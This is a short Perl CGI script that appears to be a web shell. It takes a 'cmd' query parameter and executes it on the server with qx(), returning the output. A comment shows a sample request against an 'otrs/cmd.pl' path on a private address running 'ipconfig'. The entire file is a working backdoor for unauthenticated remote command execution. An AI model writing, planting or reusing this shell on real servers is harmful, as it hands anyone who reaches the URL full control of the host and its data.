use CGI;

# Example GET request:
# http://192.168.41.239/otrs/cmd.pl?cmd=ipconfig

my $request = CGI->new();
my $cmd = $request->param('cmd');
print qx($cmd);
